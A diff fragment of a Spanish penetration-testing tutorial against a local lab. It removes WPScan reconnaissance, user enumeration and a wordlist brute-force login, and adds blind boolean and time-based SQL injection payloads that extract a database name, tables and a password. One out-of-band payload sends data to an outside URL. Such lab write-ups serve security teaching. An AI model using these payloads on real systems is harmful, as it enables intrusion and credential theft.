-             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
-
-         WordPress Security Scanner by the WPScan Team
-                         Version 3.8.28
-       Sponsored by Automattic - https://automattic.com/
-       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-_______________________________________________________________
-
-[+] URL: http://localhost:8080/ [::1]
-[+] Started: Sat Apr 12 19:05:48 2025
-
-Interesting Finding(s):
-
-[+] Headers
- | Interesting Entries:
- |  - Server: Apache/2.4.62 (Debian)
- |  - X-Powered-By: PHP/8.2.28
- | Found By: Headers (Passive Detection)
- | Confidence: 100%
-
-[+] XML-RPC seems to be enabled: http://localhost:8080/xmlrpc.php
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
- | References:
- |  - http://codex.wordpress.org/XML-RPC_Pingback_API
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
- |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
-
-[+] WordPress readme found: http://localhost:8080/readme.html
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
-
-[+] The external WP-Cron seems to be enabled: http://localhost:8080/wp-cron.php
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 60%
- | References:
- |  - https://www.iplocation.net/defend-wordpress-from-ddos
- |  - https://github.com/wpscanteam/wpscan/issues/1299
-
-[+] WordPress version 6.7.2 identified (Latest, released on 2025-02-11).
- | Found By: Rss Generator (Passive Detection)
- |  - http://localhost:8080/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=6.7.2&lt;/generator&gt;
- |  - http://localhost:8080/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=6.7.2&lt;/generator&gt;
-
-[+] WordPress theme in use: twentytwentyfive
- | Location: http://localhost:8080/wp-content/themes/twentytwentyfive/
- | Last Updated: 2025-02-11T00:00:00.000Z
- | Readme: http://localhost:8080/wp-content/themes/twentytwentyfive/readme.txt
- | [!] The version is out of date, the latest version is 1.1
- | Style URL: http://localhost:8080/wp-content/themes/twentytwentyfive/style.css?ver=1.0
- | Style Name: Twenty Twenty-Five
- | Style URI: https://wordpress.org/themes/twentytwentyfive/
- | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...
- | Author: the WordPress team
- | Author URI: https://wordpress.org
- |
- | Found By: Css Style In Homepage (Passive Detection)
- |
- | Version: 1.0 (80% confidence)
- | Found By: Style (Passive Detection)
- |  - http://localhost:8080/wp-content/themes/twentytwentyfive/style.css?ver=1.0, Match: 'Version: 1.0'
-
-[+] Enumerating All Plugins (via Passive Methods)
-
-[i] No plugins Found.
-
-[+] Enumerating Config Backups (via Passive and Aggressive Methods)
- Checking Config Backups - Time: 00:00:00 &lt;=============================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:00
-
-[i] No Config Backups Found.
-
-[!] No WPScan API Token given, as a result vulnerability data has not been output.
-[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
-
-[+] Finished: Sat Apr 12 19:05:52 2025
-[+] Requests Done: 170
-[+] Cached Requests: 5
-[+] Data Sent: 44.104 KB
-[+] Data Received: 253.503 KB
-[+] Memory used: 269.578 MB
-[+] Elapsed time: 00:00:03</code></pre>
+<img src="assets/blind/boolean-based/Recon2.png" alt="Reconocimiento2">
 </div>
-</div>
-</div>
-</details>
-<div class="ulist">
-<ul>
-<li>
-<p><strong>[+] Headers</strong></p>
-</li>
-</ul>
-</div>
-<div class="paragraph">
-<p>Podemos ver cómo se están exponiendo cabeceras del servidor y del lenguaje utilizado. Gracias a esto podemos buscar CVEs para las versiones de estos servicios y explotarlos</p>
 </div>
 <div class="listingblock">
 <div class="content">
-<pre>Server: Apache/2.4.62 (Debian)
-X-Powered-By: PHP/8.2.28</pre>
+<pre>Usuario: admin' AND 1=2 --
+Contraseña:</pre>
 </div>
 </div>
-<div class="ulist">
-<ul>
-<li>
-<p><strong>[+] XML-RPC Enabled</strong></p>
-</li>
-</ul>
-</div>
-<div class="paragraph">
-<p>XML-RPC es un protocolo que permite a aplicaciones externas interactuar con WordPress (ej: publicación remota). Tener esta habilitado es altamente peligroso y explotable.
-Puede usarse para: ataques de fuerza bruta por amplificación, pingback DDoS o escaneo de usuarios.</p>
-</div>
-<div class="listingblock">
+<div class="imageblock text-center">
 <div class="content">
-<pre>http://localhost:8080/xmlrpc.php</pre>
+<img src="assets/blind/boolean-based/Recon3.png" alt="Reconocimiento3">
 </div>
 </div>
-<div class="ulist">
-<ul>
-<li>
-<p><strong>[+] WordPress readme found</strong></p>
-</li>
-</ul>
-</div>
-<div class="paragraph">
-<p>Este archivo contiene la versión exacta de WordPress, lo que facilita identificar vulnerabilidades específicas de esa versión.</p>
-</div>
-<div class="listingblock">
+<div class="imageblock text-center">
 <div class="content">
-<pre>http://localhost:8080/readme.html</pre>
+<img src="assets/blind/boolean-based/Recon4.png" alt="Reconocimiento4">
 </div>
-</div>
-<div class="ulist">
-<ul>
-<li>
-<p><strong>[+] External WP-Cron Enabled</strong></p>
-</li>
-</ul>
-</div>
-<div class="paragraph">
-<p>Permite ejecutar tareas programadas como publicar entradas, comprobar actualizaciones, etc. Si se abusa, puede ser usado para sobrecargar el servidor con peticiones constantes (DDoS).</p>
-</div>
-<div class="listingblock">
-<div class="content">
-<pre>http://localhost:8080/wp-cron.php</pre>
-</div>
-</div>
-<div class="ulist">
-<ul>
-<li>
-<p><strong>[+] WordPress version identified: 6.7.2</strong></p>
-</li>
-</ul>
-</div>
-<div class="paragraph">
-<p>La versión del CMS puede extraerse fácilmente de los feeds RSS. Conocer la versión nos facilita ataques específicos.</p>
-</div>
-<div class="ulist">
-<ul>
-<li>
-<p><strong>[+] WordPress Theme: twentytwentyfive</strong></p>
-</li>
-</ul>
-</div>
-<div class="paragraph">
-<p>La version está desactualizada: 1.0 (última: 1.1). Esto es inseguro ya que las versiones desactualizadas de temas pueden contener vulnerabilidades.</p>
-</div>
-<div class="ulist">
-<ul>
-<li>
-<p><strong>[i] No Plugins Encontrados</strong></p>
-</li>
-</ul>
-</div>
-<div class="paragraph">
-<p>En este caso no hay plugins con vulnerabilidades.</p>
-</div>
-<div class="ulist">
-<ul>
-<li>
-<p><strong>[+] Enumeración de Config Backups</strong></p>
-</li>
-</ul>
-</div>
-<div class="paragraph">
-<p>No se encontraron backups públicos.</p>
 </div>
 </div>
 <div class="sect4">
-<h5 id="_2_reconocimiento_de_usuarios">2. Reconocimiento de usuarios</h5>
+<h5 id="_payloads_3">Payloads</h5>
 <div class="paragraph">
-<p>En este escaneo, esperamos conseguir los usuarios que tienen acceso a wp-admin</p>
+<p><strong>Inferir nombre de la base de datos</strong></p>
+</div>
+<div class="paragraph">
+<p>En esta parte, cómo queremos algo muy específico que es el nombre de la base de datos, podemos ir letra por letra para ir sacando el nombre de la base de datos o tener un script y usar un diccionario para sacarlo más rápido. En este caso buscamos <strong>banco</strong>.</p>
 </div>
 <div class="listingblock">
 <div class="content">
-<pre class="highlight"><code class="language-bash" data-lang="bash">$ wpscan --url http://localhost:8080 --enumerate u</code></pre>
+<pre>Usuario: admin' AND SUBSTRING(database(),1,1) = 'a' --
+Contraseña:</pre>
 </div>
-</div>
-<details>
-<summary class="title">WPscan Usuarios</summary>
-<div class="content">
-<div class="listingblock">
-<div class="content">
-<pre class="highlight"><code class="language-text" data-lang="text">[+] Enumerating Users (via Passive and Aggressive Methods)
- Brute Forcing Author IDs - Time: 00:00:00 &lt;==============================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00
-
-[i] User(s) Identified:
-
-[+] root
- | Found By: Rss Generator (Passive Detection)
- | Confirmed By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
-
-[+] accidia
- | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</code></pre>
-</div>
-</div>
-</div>
-</details>
-<div class="paragraph">
-<p>He cogido directamente la parte de los usuarios, ya que vuelve hacer un escaner general, y eso ya ha sido explicado anteriormente.</p>
 </div>
 <div class="paragraph">
-<p>Como podemos observar hemos obtenido dos usuarios que son <strong>root</strong> y <strong>accidia</strong>, gracias a esto podemos realizar ataques de fuerza bruta.</p>
+<p>Y así deberemos seguir con cada letra, obviamente esto no está pensado para hacerlo así y hay scripts que solucionan estos problemas. Una herramienta muy eficaz es <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a>.</p>
 </div>
 <div class="ulist">
 <ul>
 <li>
-<p><strong>Enumeración pasiva (RSS Generator)</strong> &#8594; Al acceder al feed RSS (/?feed=rss2), WordPress expone automáticamente metadatos que incluyen el autor de las entradas. Por eso WPScan identificó al usuario root sin necesidad de interactuar directamente con la web.</p>
+<p><strong>SUBSTRING(database(),1,1)</strong> &#8594; Toma el primer carácter del nombre de la base de datos. Para pasar al siguiente caracter sería SUBSTRING(database(),2,1), etc.</p>
 </li>
 <li>
-<p><strong>Enumeración agresiva (Author Pattern)</strong> &#8594; WPScan hace peticiones a URLs como /author=1, /author=2, etc., y observa los redireccionamientos y títulos de las páginas para deducir el nombre de usuario. Así encontró accidia.</p>
+<p><strong>= 'b'</strong> &#8594; Compara si ese carácter es 'b'.</p>
+</li>
+</ul>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/boolean-based/BaseDatos1.png" alt="BaseDatos1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/boolean-based/BaseDatos2.png" alt="BaseDatos2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND SUBSTRING(database(),1,1) = 'b' --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/boolean-based/BaseDatos3.png" alt="BaseDatos3">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/boolean-based/BaseDatos4.png" alt="BaseDatos4">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Inferir nombre de tablas</strong></p>
+</div>
+<div class="paragraph">
+<p>En este caso buscamos <strong>usuarios</strong> en la base de datos actual.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) = 'a' --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/boolean-based/Tablas1.png" alt="Tablas1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/boolean-based/Tablas2.png" alt="Tablas2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) = 'u' --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/boolean-based/Tablas3.png" alt="Tablas3">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/boolean-based/Tablas4.png" alt="Tablas4">
+</div>
+</div>
+<div class="paragraph">
+<p>Este payload consulta la primera tabla del esquema actual y verifica si empieza con la letra 'u'. Se van cambiando posiciones (LIMIT 1,1, LIMIT 2,1, etc.) y posiciones del carácter (SUBSTRING(&#8230;&#8203;,2,1), etc.) para inferir cada tabla y cada letra.</p>
+</div>
+<div class="paragraph">
+<p><strong>Extraer columnas de una tabla</strong></p>
+</div>
+<div class="paragraph">
+<p>En este caso buscamos <strong>usuario</strong> en la tabla <strong>usuarios</strong>.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND (SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns WHERE table_name='usuarios' LIMIT 1,1) = 'u' --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/boolean-based/Columnas1.png" alt="Columnas1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/boolean-based/Columnas2.png" alt="Columnas2">
+</div>
+</div>
+<div class="paragraph">
+<p>Y al igual que el resto se debe de ir carácter por carácter para obtener la pálabra correcta. Se van cambiando posiciones (LIMIT 1,1, LIMIT 2,1, etc.) y posiciones del carácter (SUBSTRING(&#8230;&#8203;,2,1), etc.) para inferir cada tabla y cada letra.</p>
+</div>
+<div class="paragraph">
+<p><strong>Extraer datos</strong></p>
+</div>
+<div class="paragraph">
+<p>En este caso buscamos <strong>admin123</strong> en la columna <strong>password</strong>.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND (SELECT SUBSTRING(usuario,1,1) FROM usuarios LIMIT 1,1) = 'u' --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/boolean-based/Contraseña1.png" alt="Contraseña1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/boolean-based/Contraseña2.png" alt="Contraseña2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND (SELECT SUBSTRING(usuario,2,1) FROM usuarios LIMIT 1,1) = 's' --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/boolean-based/Contraseña3.png" alt="Contraseña3">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/boolean-based/Contraseña4.png" alt="Contraseña4">
+</div>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_aclaración">Aclaración</h5>
+<div class="paragraph">
+<p>Como hemos visto, este ataque es muy repetitivo, por lo que he recalcado que es mucho más eficaz realizarlo mediante un script. Además, en un caso real no conoceremos de antemano ninguna información, por eso he explicado en cada paso qué es lo que busco, para ir directo al objetivo y no perder tiempo con pruebas innecesarias.</p>
+</div>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_b_time_based_sql_injection_2">b. Time-based SQL Injection</h4>
+<div class="paragraph">
+<p>Este tipo de ataque es muy parecido al anterior, por lo que también recomendaría usar un script</p>
+</div>
+<div class="sect4">
+<h5 id="_reconocimiento_4">Reconocimiento</h5>
+<div class="paragraph">
+<p>En este tipo de ataques, notaremos que si es verdadero la página empezará a cargar, si es falso la página se actualizará con normalidad.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND IF(1=1, SLEEP(5), 0) --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/time/Recon1.png" alt="Reconocimiento1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/time/Recon2.png" alt="Reconocimiento2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND IF(1=2, SLEEP(5), 0) --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/time/Recon3.png" alt="Reconocimiento3">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/time/Recon4.png" alt="Reconocimiento4">
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>AND IF(1=1, SLEEP(5), 0)</strong> &#8594; Si la condición 1=1 es verdadera (siempre lo es), el servidor ejecutará SLEEP(5) y causará un retraso de 5 segundos.</p>
 </li>
 </ul>
 </div>
 </div>
 <div class="sect4">
-<h5 id="_3_otros_tipos_de_escaneos">3. Otros tipos de escaneos</h5>
+<h5 id="_payloads_4">Payloads</h5>
 <div class="paragraph">
-<p>Cómo ya hemos visto, wpscan es una herramienta muy poderosa contra páginas de WordPress, por eso voy a mostrar otros tipos de enumeración que nos pueden servir para obtener más información:</p>
+<p><strong>Obtener el nombre de la base de datos completo</strong></p>
+</div>
+<div class="paragraph">
+<p>Como ya sabemos que es <strong>banco</strong> podemos buscar directamente, pero ocurre como en el anterior ataque.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND IF(SUBSTRING(DATABASE(),1,1) = 'b', SLEEP(5), 0) --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/time/BaseDatos1.png" alt="BaseDatos1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/time/BaseDatos2.png" alt="BaseDatos2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>admin' AND IF(SUBSTRING(DATABASE(),1,1) = 'b', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING(DATABASE(),2,1) = 'a', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING(DATABASE(),3,1) = 'n', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING(DATABASE(),4,1) = 'c', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING(DATABASE(),5,1) = 'o', SLEEP(5), 0) --</pre>
+</div>
 </div>
 <div class="ulist">
 <ul>
 <li>
-<p><strong>Escanear y enumerar plugins y temas</strong></p>
+<p><strong>IF(SUBSTRING(DATABASE(),1,1) = 'a', SLEEP(5), 0)</strong> &#8594; Si el primer carácter es 'a', el servidor esperará 5 segundos (esto es el ataque Time-Based).</p>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>SUBSTRING(DATABASE(),1,1)</strong> &#8594; Extrae el primer carácter del nombre de la base de datos.</p>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>DATABASE()</strong> Función de MySQL que devuelve el nombre de la base de datos actual.</p>
+</li>
+</ul>
+</div>
+</li>
+</ul>
+</div>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p><strong>Obtener tablas sobre la base de datos</strong></p>
+</div>
+<div class="paragraph">
+<p>En este caso vamos a buscar la tabla <strong>usuarios</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),1,1) = 'u', SLEEP(5), 0) --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/time/Tablas1.png" alt="Tablas1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/time/Tablas2.png" alt="Tablas2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),1,1) = 'u', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),2,1) = 's', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),3,1) = 'u', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),4,1) = 'a', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),5,1) = 'r', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),6,1) = 'i', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),7,1) = 'o', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1),8,1) = 's', SLEEP(5), 0) --</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE()</strong> &#8594; Consulta que selecciona las tablas de la base de datos actual.</p>
+</li>
+<li>
+<p><strong>SUBSTRING(&#8230;&#8203;)</strong> &#8594; Extrae el primer carácter del nombre de la primera tabla.</p>
+</li>
+<li>
+<p><strong>SLEEP(5)</strong> &#8594; Si el primer carácter es correcto (en este caso, 'u'), el servidor hará una pausa de 5 segundos.</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p><strong>Obtener las columnas de una tabla</strong></p>
+</div>
+<div class="paragraph">
+<p>En este caso vamos a buscar la columna <strong>id</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'usuarios' LIMIT 1),1,1) = 'i', SLEEP(5), 0) --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/time/Columnas1.png" alt="Columnas1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/time/Columnas2.png" alt="Columnas2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>admin' AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'usuarios' LIMIT 1),1,1) = 'i', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'usuarios' LIMIT 1),2,1) = 'd', SLEEP(5), 0) --</pre>
+</div>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>SELECT column_name FROM information_schema.columns WHERE table_name = 'usuarios'</strong> &#8594; Consulta que selecciona los nombres de las columnas de la tabla 'usuarios'.</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p><strong>Obtener contraseñas o datos sensibles</strong></p>
+</div>
+<div class="paragraph">
+<p>En este caso vamos a buscar la contraseña <strong>admin123</strong> dentro de los columna <strong>password</strong></p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>Usuario: admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),1,1) = 'a', SLEEP(5), 0) --
+Contraseña:</pre>
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/time/Contraseña1.png" alt="Contraseña1">
+</div>
+</div>
+<div class="imageblock text-center">
+<div class="content">
+<img src="assets/blind/time/Contraseña2.png" alt="Contraseña2">
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),1,1) = 'a', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),2,1) = 'd', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),3,1) = 'm', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),4,1) = 'i', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),5,1) = 'n', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),6,1) = '1', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),7,1) = '2', SLEEP(5), 0) --
+admin' AND IF(SUBSTRING((SELECT password FROM usuarios LIMIT 1),8,1) = '3', SLEEP(5), 0) --</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>SELECT password FROM usuarios LIMIT 1: Obtiene la primera fila de la columna password de la tabla usuarios.</p>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_aclaración_2">Aclaración</h5>
+<div class="paragraph">
+<p>Como hemos podido ver, ocurre como en el caso anterior aunque cambia un poco la sintaxis, por ello recomiendo el uso de scripts en los ataques a ciegas.</p>
+</div>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_3_out_of_band_sql_injection_oob_sqli_2">3. Out-of-band SQL injection (OOB SQLi)</h3>
+<div class="paragraph">
+<p>Los ataques fuera de banda se basan en enviar la información al servidor http o dns del atacante. En nuestro caso, no podemos realizarlos ya que la base de datos debe hacer peticiones externas y al estar en local no se puede, de todas formas, vamos a ver cómo se realizan estos ataques.</p>
+</div>
+<div class="paragraph">
+<p>Hay que entender que estos ataques se realizan cuando el atacante no puede usar el mismo canal para enviar el ataque y recibir los datos o cuando el servidor responde que es inestable. Normalmente se realiza por HTTP. Y es importante que el servidor no tenga --secure-file-priv, ya que limita la lectura o escritura de atchivos a un directorio específico.</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>El atacante realiza una consulta a la web con un payload como los siguientes:</p>
 </li>
 </ul>
 </div>
 <div class="listingblock">
 <div class="content">
-<pre class="highlight"><code class="language-bash" data-lang="bash">$ wpscan --url https://example.com --enumerate ap,at</code></pre>
-</div>
-</div>
-<div class="paragraph">
-<p>ap &#8594; all plugins.</p>
-</div>
-<div class="paragraph">
-<p>at &#8594; all templates.</p>
-</div>
-<div class="ulist">
-<ul>
-<li>
-<p><strong>Enumerar todas las vulnerabilidades</strong></p>
-</li>
-</ul>
-</div>
-<div class="listingblock">
-<div class="content">
-<pre class="highlight"><code class="language-bash" data-lang="bash">$ wpscan --url https://example.com --enumerate vp,vt,tt</code></pre>
-</div>
-</div>
-<div class="paragraph">
-<p>vp &#8594; vulnerable plugins.</p>
-</div>
-<div class="paragraph">
-<p>vt &#8594; vulnerable themes.</p>
-</div>
-<div class="paragraph">
-<p>tt &#8594; vulnerable timthumbs.</p>
-</div>
-<div class="paragraph">
-<p>Una vez identificamos versiones vulnerables de plugins, temas u otros componentes, tenemos varias formas de continuar el ataque o la investigación:</p>
-</div>
-<div class="ulist">
-<ul>
-<li>
-<p><strong>Buscar vulnerabilidades manualmente</strong></p>
-</li>
-</ul>
-</div>
-<div class="paragraph">
-<p>Copiamos la versión del plugin/tema vulnerable y la buscamos en un navegador con términos como:</p>
-</div>
-<div class="listingblock">
-<div class="content">
-<pre>(plugin-name) (version) exploit o (plugin-name) CVE.</pre>
-</div>
-</div>
-<div class="paragraph">
-<p>Es común encontrar repositorios en GitHub, foros o blogs donde se comparten proof of concept (PoC) o incluso exploits funcionales.</p>
-</div>
-<div class="ulist">
-<ul>
-<li>
-<p><strong>Usar bases de datos de exploits públicos</strong></p>
-</li>
-</ul>
-</div>
-<div class="paragraph">
-<p><a href="https://www.exploit-db.com">Exploit-DB</a>: Es una base de datos de vulnerabilidades conocida que incluye descripciones técnicas, PoCs y a veces exploits completos. Buscar por nombre de plugin, tema o CVE detectado.</p>
-</div>
-<div class="ulist">
-<ul>
-<li>
-<p><strong>Usar SearchSploit (offline)</strong></p>
-</li>
-</ul>
-</div>
-<div class="paragraph">
-<p><a href="https://www.exploit-db.com/searchsploit">SearchSploit</a> es una herramienta incluida en Kali Linux que permite buscar localmente en la base de datos de Exploit-DB:</p>
-</div>
-<div class="listingblock">
-<div class="content">
-<pre class="highlight"><code class="language-bash" data-lang="bash">$ searchsploit nombre_del_plugin_o_vulnerabilidad</code></pre>
-</div>
-</div>
-<div class="paragraph">
-<p>También permite mostrar o copiar el exploit directamente:</p>
-</div>
-<div class="listingblock">
-<div class="content">
-<pre class="highlight"><code class="language-bash" data-lang="bash">$ searchsploit -m exploit/path</code></pre>
-</div>
-</div>
-</div>
-</div>
-<div class="sect3">
-<h4 id="_ataque">Ataque</h4>
-<div class="paragraph">
-<p>Una vez obtenidos los usuarios, vamos a realizar un ataque de fuerza bruta con wpscan. Pero antes tenemos que saber que es un ataque de fuerza bruta.</p>
-</div>
-<div class="paragraph">
-<p>Un ataque de fuerza bruta es un tipo de ataque que utiliza pruebas y errores para descifrar contraseñas, credenciales de inicio de sesión y claves de cifrado. Es una táctica simple pero confiable para obtener acceso no autorizado a cuentas individuales y sistemas y redes de organizaciones.</p>
-</div>
-<div class="paragraph">
-<p>Estos ataques requieren mucho tiempo, especialmente cuando se utilizan contraseñas largas o complejas. Además este proceso puede consumir grandes cantidades de recursos del sistema (como la CPU y la memoria), lo que hace que el ataque sea lento y costoso en términos de rendimiento. Además son más faciles de detectar ya que generan grandes cantidades de tráfico de red o múltiples intentos de inicio de sesión fallidos.</p>
-</div>
-<div class="paragraph">
-<p>Existen varios tipos, pero nosotros vamos a usar el ataque por diccionario, en este el atacante selecciona un objetivo y luego prueba las posibles contraseñas contra el nombre de usuario de esa persona.</p>
-</div>
-<div class="paragraph">
-<p>Kali Linux viene con varios diccionarios preinstalados en la ruta /usr/share/wordlists, que forman parte de sus herramientas, podemos verlo más en detalle en el siguiente enlace <a href="https://www.kali.org/tools/wordlists/">Wordlists</a>. Recomiendo primeramente probar diccionarios pequeños, sobretodo si encontramos indicios de credenciales por defecto, ya que tardará menos que si utilizamos diccionarios más grandes como <a href="https://github.com/intelligencegroup-io/RockYou2024">rockyou 2024</a> con 9,948,575,739 contraseñas.</p>
-</div>
-<div class="listingblock">
-<div class="content">
-<pre class="highlight"><code class="language-bash" data-lang="bash">$ wpscan --url https://localhost:8080 -U root -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt</code></pre>
-</div>
-</div>
-<details>
-<summary class="title">WPscan Password</summary>
-<div class="content">
-<div class="listingblock">
-<div class="content">
-<pre class="highlight"><code class="language-text" data-lang="text">[+] Performing password attack on Xmlrpc against 1 user/s
-[SUCCESS] - root / root
-Trying root / roost Time: 00:03:02 &lt;=================================================                                                                &gt; (38665 / 86268) 44.81%  ETA: ??:??:??
+<pre>- HTTP: ' UNION SELECT NULL,NULL,(...),CONCAT('http://example.com/?data=', @@version) ;--
 
-[!] Valid Combinations Found:
- | Username: root, Password: root</code></pre>
